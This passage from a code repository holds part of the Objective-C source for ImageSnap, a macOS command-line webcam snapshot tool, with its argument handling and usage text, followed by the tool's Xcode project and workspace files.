	mCaptureDeviceInput = [[QTCaptureDeviceInput alloc] initWithDevice:device];
	verbose( "Done.\n");
	if (![mCaptureSession addInput:mCaptureDeviceInput error:&error]) {
		error( "\tCould not convert device to input device.\n");
        [mCaptureSession release];
        [mCaptureDeviceInput release];
        mCaptureSession = nil;
        mCaptureDeviceInput = nil;
		return NO;
	}
    
	
	// Decompressed video output
	verbose( "\tCreating QTCaptureDecompressedVideoOutput...");
	mCaptureDecompressedVideoOutput = [[QTCaptureDecompressedVideoOutput alloc] init];
	[mCaptureDecompressedVideoOutput setDelegate:self];
	verbose( "Done.\n" );
	if (![mCaptureSession addOutput:mCaptureDecompressedVideoOutput error:&error]) {
		error( "\tCould not create decompressed output.\n");
        [mCaptureSession release];
        [mCaptureDeviceInput release];
        [mCaptureDecompressedVideoOutput release];
        mCaptureSession = nil;
        mCaptureDeviceInput = nil;
        mCaptureDecompressedVideoOutput = nil;
		return NO;
	}

    // Clear old image?
	verbose("\tEntering synchronized block to clear memory...");
    @synchronized(self){
        if( mCurrentImageBuffer != nil ){
            CVBufferRelease(mCurrentImageBuffer);
            mCurrentImageBuffer = nil;
        }   // end if: clear old image
    }   // end sync: self
	verbose( "Done.\n");
    
	[mCaptureSession startRunning];
	verbose("Session started.\n");
    
    return YES;
}   // end startSession



// This delegate method is called whenever the QTCaptureDecompressedVideoOutput receives a frame
- (void)captureOutput:(QTCaptureOutput *)captureOutput 
  didOutputVideoFrame:(CVImageBufferRef)videoFrame 
     withSampleBuffer:(QTSampleBuffer *)sampleBuffer 
       fromConnection:(QTCaptureConnection *)connection
{
	verbose( "." );
    if (videoFrame == nil ) {
		verbose( "'nil' Frame captured.\n" );
        return;
    }
    
    // Swap out old frame for new one
    CVImageBufferRef imageBufferToRelease;
    CVBufferRetain(videoFrame);
	
    @synchronized(self){
        imageBufferToRelease = mCurrentImageBuffer;
        mCurrentImageBuffer = videoFrame;
    }   // end sync
    CVBufferRelease(imageBufferToRelease);
    
}

@end


// //////////////////////////////////////////////////////////
//
// ////////  B E G I N   C - L E V E L   M A I N  //////// //
//
// //////////////////////////////////////////////////////////

int processArguments(int argc, const char * argv[]);
void printUsage(int argc, const char * argv[]);
int listDevices();
NSString *generateFilename();
QTCaptureDevice *getDefaultDevice();


// Main entry point. Since we're using Cocoa and all kinds of fancy
// classes, we have to set up appropriate pools and loops.
// Thanks to the example http://lists.apple.com/archives/cocoa-dev/2003/Apr/msg01638.html
// for reminding me how to do it.
int main (int argc, const char * argv[]) {
    NSApplicationLoad();    // May be necessary for 10.5 not to crash.
    
	NSAutoreleasePool *pool;
	pool = [[NSAutoreleasePool alloc] init];
    [NSApplication sharedApplication];
	
    int result = processArguments(argc, argv);
    
    //	[pool release];
    [pool drain];
    return result;
}



/**
 * Process command line arguments and execute program.
 */
int processArguments(int argc, const char * argv[] ){
	
	NSString *filename = nil;
	QTCaptureDevice *device = nil;
    NSNumber *warmup = nil;
    NSNumber *timelapse = nil;

	
	int i;
	for( i = 1; i < argc; ++i ){
		
		// Handle command line switches
		if (argv[i][0] == '-') {
            
            // Dash only? Means write image to stdout
            if( argv[i][1] == 0 ){
                filename = @"-";
                g_quiet = YES;
            } else {
                
                // Which switch was given
                switch (argv[i][1]) {
                    
                    // Help
                    case '?':
                    case 'h':
                        printUsage( argc, argv );
                        return 0;
                        break;

                        
                    // Verbose
                    case 'v':
                        g_verbose = YES;
                        break;
                    
                    case 'q':
                        g_quiet = YES;
                        break;

                        
                    // List devices
                    case 'l': 
                        listDevices();
                        return 0;
                        break;
                        
                    // Specify device
                    case 'd':
                        if( i+1 < argc ){
                            device = [ImageSnap deviceNamed:[NSString stringWithUTF8String:argv[i+1]]];
                            if( device == nil ){
                                error( "Device \"%s\" not found.\n", argv[i+1] );
                                return 11;
                            }   // end if: not found
                            ++i; // Account for "follow on" argument
                        } else {
                            error( "Not enough arguments given with 'd' flag.\n" );
                            return (int)'d';
                        }
                        break;
                        
                    // Specify a warmup period before picture snaps
                    case 'w':
                        if( i+1 < argc ){
                            warmup = [NSNumber numberWithFloat:[[NSString stringWithUTF8String:argv[i+1]] floatValue]];
                            ++i; // Account for "follow on" argument
                        } else {
                            error( "Not enough arguments given with 'w' flag.\n" );
                            return (int)'w';
                        }
                        break;
                        
                    // Timelapse
                    case 't':
                        if( i+1 < argc ){
                            timelapse = [NSNumber numberWithDouble:[[NSString stringWithUTF8String:argv[i+1]] doubleValue]];
                            //g_timelapse = [timelapse doubleValue];
                            ++i; // Account for "follow on" argument
                        } else {
                            error( "Not enough arguments given with 't' flag.\n" );
                            return (int)'t';
                        }
                        break;

                    
                        
                }	// end switch: flag value
            }   // end else: not dash only
		}	// end if: '-'
        
        // Else assume it's a filename
		else {
			filename = [NSString stringWithUTF8String:argv[i]];
		}

	}	// end for: each command line argument
	
    
    // Make sure we have a filename
	if( filename == nil ){
		filename = generateFilename();
		verbose( "No filename specified. Using %s\n", [filename UTF8String] );
	}	// end if: no filename given
	
    if( filename == nil ){
        error( "No suitable filename could be determined.\n" );
        return 1;
    }
	
    
    // Make sure we have a device
	if( device == nil ){
		device = getDefaultDevice();
		verbose( "No device specified. Using %s\n", [[device description] UTF8String] );
	}	// end if: no device given
	
    if( device == nil ){
        error( "No video devices found.\n" );
        return 2;
    } else {
        console( "Capturing image from device \"%s\"...", [[device description] UTF8String] );
    }
	
    
    // Image capture
    if( [ImageSnap saveSingleSnapshotFrom:device toFile:filename withWarmup:warmup withTimelapse:timelapse] ){
        console( "%s\n", [filename UTF8String] );
    } else {
        error( "Error.\n" );
    }   // end else
    
    return 0;
}



void printUsage(int argc, const char * argv[]){
    printf( "USAGE: %s [options] [filename]\n", argv[0] );
    printf( "Version: %s\n", [VERSION UTF8String] );
    printf( "Captures an image from a video device and saves it in a file.\n" );
    printf( "If no device is specified, the system default will be used.\n" );
    printf( "If no filename is specfied, snapshot.jpg will be used.\n" );
    printf( "Supported image types: JPEG, TIFF, PNG, GIF, BMP\n" );
    printf( "  -h          This help message\n" );
    printf( "  -v          Verbose mode\n");
    printf( "  -l          List available video devices\n" );
    printf( "  -t x.xx     Take a picture every x.xx seconds\n" );
    printf( "  -q          Quiet mode. Do not output any text\n");
    printf( "  -w x.xx     Warmup. Delay snapshot x.xx seconds after turning on camera\n" );
    printf( "  -d device   Use named video device\n" );
}





/**
 * Prints a list of video capture devices to standard out.
 */
int listDevices(){
	NSArray *devices = [ImageSnap videoDevices];
    
    [devices count] > 0 
		? printf("Video Devices:\n") 
		: printf("No video devices found.\n");
    
	for( QTCaptureDevice *device in devices ){
		printf( "%s\n", [[device description] UTF8String] );
	}	// end for: each device
    return [devices count];
}

/**
 * Generates a filename for saving the image, presumably
 * because the user didn't specify a filename.
 * Currently returns snapshot.tiff.
 */
NSString *generateFilename(){
	NSString *result = @"snapshot.jpg";
	return result;
}	// end


/**
 * Gets a default video device, or nil if none is found.
 * For now, simply queries ImageSnap. May be fancier
 * in the future.
 */
QTCaptureDevice *getDefaultDevice(){
	return [ImageSnap defaultVideoDevice];
}	// end




```

`Tools/ImageSnap-v0.2.5/ImageSnap.xcodeproj/project.pbxproj`:

```pbxproj
// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 46;
	objects = {

/* Begin PBXBuildFile section */
		8DD76F790486A8DE00D96B5E /* CoreFoundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 09AB6884FE841BABC02AAC07 /* CoreFoundation.framework */; };
		D44480A7105BFF5600756CA8 /* ImageSnap.m in Sources */ = {isa = PBXBuildFile; fileRef = D44480A6105BFF5600756CA8 /* ImageSnap.m */; };
		D48D572910598E4000885DA8 /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D48D572810598E4000885DA8 /* Cocoa.framework */; };
		D48D572B10598E4000885DA8 /* QTKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D48D572A10598E4000885DA8 /* QTKit.framework */; };
		D48D572D10598E4000885DA8 /* Quartz.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D48D572C10598E4000885DA8 /* Quartz.framework */; };
/* End PBXBuildFile section */

/* Begin PBXCopyFilesBuildPhase section */
		8DD76F7B0486A8DE00D96B5E /* CopyFiles */ = {
			isa = PBXCopyFilesBuildPhase;
			buildActionMask = 8;
			dstPath = /usr/share/man/man1/;
			dstSubfolderSpec = 0;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 1;
		};
/* End PBXCopyFilesBuildPhase section */

/* Begin PBXFileReference section */
		09AB6884FE841BABC02AAC07 /* CoreFoundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreFoundation.framework; path = /System/Library/Frameworks/CoreFoundation.framework; sourceTree = "<absolute>"; };
		D44480A5105BFF5600756CA8 /* ImageSnap.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = ImageSnap.h; sourceTree = "<group>"; };
		D44480A6105BFF5600756CA8 /* ImageSnap.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = ImageSnap.m; sourceTree = "<group>"; };
		D48D572810598E4000885DA8 /* Cocoa.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Cocoa.framework; path = /System/Library/Frameworks/Cocoa.framework; sourceTree = "<absolute>"; };
		D48D572A10598E4000885DA8 /* QTKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = QTKit.framework; path = /System/Library/Frameworks/QTKit.framework; sourceTree = "<absolute>"; };
		D48D572C10598E4000885DA8 /* Quartz.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Quartz.framework; path = /System/Library/Frameworks/Quartz.framework; sourceTree = "<absolute>"; };
		D49AA9851085011600FE189B /* ReadMeOrDont.rtf */ = {isa = PBXFileReference; lastKnownFileType = text.rtf; path = ReadMeOrDont.rtf; sourceTree = "<group>"; };
		D4C1B149105C049B00FCB6A2 /* imagesnap */ = {isa = PBXFileReference; explicitFileType = "compiled.mach-o.executable"; includeInIndex = 0; path = imagesnap; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		8DD76F780486A8DE00D96B5E /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8DD76F790486A8DE00D96B5E /* CoreFoundation.framework in Frameworks */,
				D48D572910598E4000885DA8 /* Cocoa.framework in Frameworks */,
				D48D572B10598E4000885DA8 /* QTKit.framework in Frameworks */,
				D48D572D10598E4000885DA8 /* Quartz.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		08FB7794FE84155DC02AAC07 /* ImageSnap */ = {
			isa = PBXGroup;
			children = (
				08FB7795FE84155DC02AAC07 /* Source */,
				C6859E96029091FE04C91782 /* Documentation */,
				08FB779DFE84155DC02AAC07 /* External Frameworks and Libraries */,
				19C28FBDFE9D53C911CA2CBB /* Products */,
			);
			name = ImageSnap;
			sourceTree = "<group>";
		};
		08FB7795FE84155DC02AAC07 /* Source */ = {
			isa = PBXGroup;
			children = (
				D44480A5105BFF5600756CA8 /* ImageSnap.h */,
				D44480A6105BFF5600756CA8 /* ImageSnap.m */,
			);
			name = Source;
			sourceTree = "<group>";
		};
		08FB779DFE84155DC02AAC07 /* External Frameworks and Libraries */ = {
			isa = PBXGroup;
			children = (
				09AB6884FE841BABC02AAC07 /* CoreFoundation.framework */,
				D48D572810598E4000885DA8 /* Cocoa.framework */,
				D48D572A10598E4000885DA8 /* QTKit.framework */,
				D48D572C10598E4000885DA8 /* Quartz.framework */,
			);
			name = "External Frameworks and Libraries";
			sourceTree = "<group>";
		};
		19C28FBDFE9D53C911CA2CBB /* Products */ = {
			isa = PBXGroup;
			children = (
				D4C1B149105C049B00FCB6A2 /* imagesnap */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		C6859E96029091FE04C91782 /* Documentation */ = {
			isa = PBXGroup;
			children = (
				D49AA9851085011600FE189B /* ReadMeOrDont.rtf */,
			);
			name = Documentation;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		8DD76F740486A8DE00D96B5E /* imagesnap */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 1DEB924708733DCA0010E9CD /* Build configuration list for PBXNativeTarget "imagesnap" */;
			buildPhases = (
				8DD76F760486A8DE00D96B5E /* Sources */,
				8DD76F780486A8DE00D96B5E /* Frameworks */,
				8DD76F7B0486A8DE00D96B5E /* CopyFiles */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = imagesnap;
			productInstallPath = "$(HOME)/bin";
			productName = ImageSnap;
			productReference = D4C1B149105C049B00FCB6A2 /* imagesnap */;
			productType = "com.apple.product-type.tool";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		08FB7793FE84155DC02AAC07 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastUpgradeCheck = 0410;
			};
			buildConfigurationList = 1DEB924B08733DCA0010E9CD /* Build configuration list for PBXProject "ImageSnap" */;
			compatibilityVersion = "Xcode 3.2";
			developmentRegion = English;
			hasScannedForEncodings = 1;
			knownRegions = (
				English,
				Japanese,
				French,
				German,
			);
			mainGroup = 08FB7794FE84155DC02AAC07 /* ImageSnap */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				8DD76F740486A8DE00D96B5E /* imagesnap */,
			);
		};
/* End PBXProject section */

/* Begin PBXSourcesBuildPhase section */
		8DD76F760486A8DE00D96B5E /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				D44480A7105BFF5600756CA8 /* ImageSnap.m in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		1DEB924808733DCA0010E9CD /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				COPY_PHASE_STRIP = NO;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_MODEL_TUNING = G5;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_VERSION = com.apple.compilers.llvm.clang.1_0;
				INSTALL_PATH = /usr/local/bin;
				PRODUCT_NAME = imagesnap;
				RUN_CLANG_STATIC_ANALYZER = YES;
				SDKROOT = macosx;
			};
			name = Debug;
		};
		1DEB924908733DCA0010E9CD /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				GCC_MODEL_TUNING = G5;
				INSTALL_PATH = /usr/local/bin;
				PRODUCT_NAME = imagesnap;
				SDKROOT = macosx;
			};
			name = Release;
		};
		1DEB924C08733DCA0010E9CD /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
				GCC_C_LANGUAGE_STANDARD = gnu99;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_WARN_ABOUT_RETURN_TYPE = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = macosx10.4;
				VALID_ARCHS = "i386 x86_64";
			};
			name = Debug;
		};
		1DEB924D08733DCA0010E9CD /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
				GCC_C_LANGUAGE_STANDARD = gnu99;
				GCC_WARN_ABOUT_RETURN_TYPE = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				SDKROOT = macosx10.4;
				VALID_ARCHS = "i386 x86_64";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		1DEB924708733DCA0010E9CD /* Build configuration list for PBXNativeTarget "imagesnap" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				1DEB924808733DCA0010E9CD /* Debug */,
				1DEB924908733DCA0010E9CD /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		1DEB924B08733DCA0010E9CD /* Build configuration list for PBXProject "ImageSnap" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				1DEB924C08733DCA0010E9CD /* Debug */,
				1DEB924D08733DCA0010E9CD /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 08FB7793FE84155DC02AAC07 /* Project object */;
}

```

`Tools/ImageSnap-v0.2.5/ImageSnap.xcodeproj/project.xcworkspace/contents.xcworkspacedata`:

```xcworkspacedata
<?xml version="1.0" encoding="UTF-8"?>
<Workspace
   version = "1.0">
   <FileRef
      location = "self:ImageSnap.xcodeproj">
   </FileRef>
</Workspace>

```

`Tools/ImageSnap-v0.2.5/ImageSnap.xcodeproj/project.xcworkspace/xcuserdata/rob.xcuserdatad/UserInterfaceState.xcuserstate`:

```xcuserstate
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>$archiver</key>
	<string>NSKeyedArchiver</string>
	<key>$objects</key>
	<array>
		<string>$null</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>2</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>3</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>4</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>220</integer>
				</dict>
			</array>
		</dict>
		<string>9C463C19-C7E7-439C-9C6E-29B38C20E510</string>
		<string>IDEWorkspaceDocument</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>5</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>6</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>7</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>8</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>9</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>10</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>11</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>12</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>13</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>14</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>16</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>2</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>7</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>129</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
			</array>
		</dict>
		<string>IDEWindowFrame</string>
		<string>IDEOrderedWorkspaceTabControllers</string>
		<string>IDEWorkspaceTabController_8773A3AC-BF17-4AD5-B985-CF9E701C5594</string>
		<string>IDEWindowInFullscreenMode</string>
		<string>IDEWorkspaceWindowControllerUniqueIdentifier</string>
		<string>IDEActiveWorkspaceTabController</string>
		<string>IDEWindowToolbarIsVisible</string>
		<string>IDEWindowTabBarIsVisible</string>
		<string>{{51, 0}, {1389, 878}}</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>7</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSArray</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSArray</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>17</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>18</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>19</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>20</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>21</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>22</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>23</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>24</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>25</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>129</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>46</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>139</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>146</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>210</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>219</integer>
				</dict>
			</array>
		</dict>
		<string>IDEEditorArea</string>
		<string>IDEShowNavigator</string>
		<string>AssistantEditorsLayout</string>
		<string>IDEWorkspaceTabControllerUtilityAreaSplitView</string>
		<string>IDENavigatorArea</string>
		<string>IDEWorkspaceTabControllerDesignAreaSplitView</string>
		<string>IDEShowUtilities</string>
		<string>IDETabLabel</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>26</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>27</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>28</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>29</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>30</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>31</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>32</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>33</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>34</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>56</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>97</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>129</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>46</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>130</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>138</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>129</integer>
				</dict>
			</array>
		</dict>
		<string>layoutTree</string>
		<string>IDEEditorMode_Standard</string>
		<string>IDEEDitorArea_DebugArea</string>
		<string>IDEShowEditor</string>
		<string>EditorMode</string>
		<string>DebuggerSplitView</string>
		<string>DefaultPersistentRepresentations</string>
		<string>ShowDebuggerArea</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>55</integer>
			</dict>
			<key>geniusEditorContextNode</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>primaryEditorContextNode</key>
			<dict>
				<key>CF$UID</key>
				<integer>35</integer>
			</dict>
			<key>rootLayoutTreeNode</key>
			<dict>
				<key>CF$UID</key>
				<integer>52</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>54</integer>
			</dict>
			<key>children</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>contentType</key>
			<integer>1</integer>
			<key>documentArchivableRepresentation</key>
			<dict>
				<key>CF$UID</key>
				<integer>36</integer>
			</dict>
			<key>orientation</key>
			<integer>0</integer>
			<key>parent</key>
			<dict>
				<key>CF$UID</key>
				<integer>52</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>51</integer>
			</dict>
			<key>DocumentLocation</key>
			<dict>
				<key>CF$UID</key>
				<integer>47</integer>
			</dict>
			<key>DomainIdentifier</key>
			<dict>
				<key>CF$UID</key>
				<integer>37</integer>
			</dict>
			<key>IdentifierPath</key>
			<dict>
				<key>CF$UID</key>
				<integer>38</integer>
			</dict>
			<key>IndexOfDocumentIdentifier</key>
			<dict>
				<key>CF$UID</key>
				<integer>46</integer>
			</dict>
		</dict>
		<string>Xcode.IDENavigableItemDomain.WorkspaceStructure</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>39</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>42</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>44</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>41</integer>
			</dict>
			<key>Identifier</key>
			<dict>
				<key>CF$UID</key>
				<integer>40</integer>
			</dict>
		</dict>
		<string>ImageSnap.m</string>
		<dict>
			<key>$classes</key>
			<array>
				<string>IDEArchivableStringIndexPair</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>IDEArchivableStringIndexPair</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>41</integer>
			</dict>
			<key>Identifier</key>
			<dict>
				<key>CF$UID</key>
				<integer>43</integer>
			</dict>
		</dict>
		<string>Source</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>41</integer>
			</dict>
			<key>Identifier</key>
			<dict>
				<key>CF$UID</key>
				<integer>45</integer>
			</dict>
		</dict>
		<string>ImageSnap</string>
		<integer>0</integer>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>50</integer>
			</dict>
			<key>documentURL</key>
			<dict>
				<key>CF$UID</key>
				<integer>48</integer>
			</dict>
			<key>timestamp</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>file://localhost/Users/rob/Documents/iHarder_SVN_Checkout/imagesnap/ImageSnap.m</string>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSMutableString</string>
				<string>NSString</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSMutableString</string>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>DVTDocumentLocation</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>DVTDocumentLocation</string>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>IDENavigableItemArchivableRepresentation</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>IDENavigableItemArchivableRepresentation</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>54</integer>
			</dict>
			<key>children</key>
			<dict>
				<key>CF$UID</key>
				<integer>53</integer>
			</dict>
			<key>contentType</key>
			<integer>0</integer>
			<key>documentArchivableRepresentation</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>orientation</key>
			<integer>0</integer>
			<key>parent</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>35</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>IDEWorkspaceTabControllerLayoutTreeNode</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>IDEWorkspaceTabControllerLayoutTreeNode</string>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>IDEWorkspaceTabControllerLayoutTree</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>IDEWorkspaceTabControllerLayoutTree</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>57</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>58</integer>
				</dict>
			</array>
		</dict>
		<string>EditorLayout_PersistentRepresentation</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>59</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>60</integer>
				</dict>
			</array>
		</dict>
		<string>Main</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>61</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>62</integer>
				</dict>
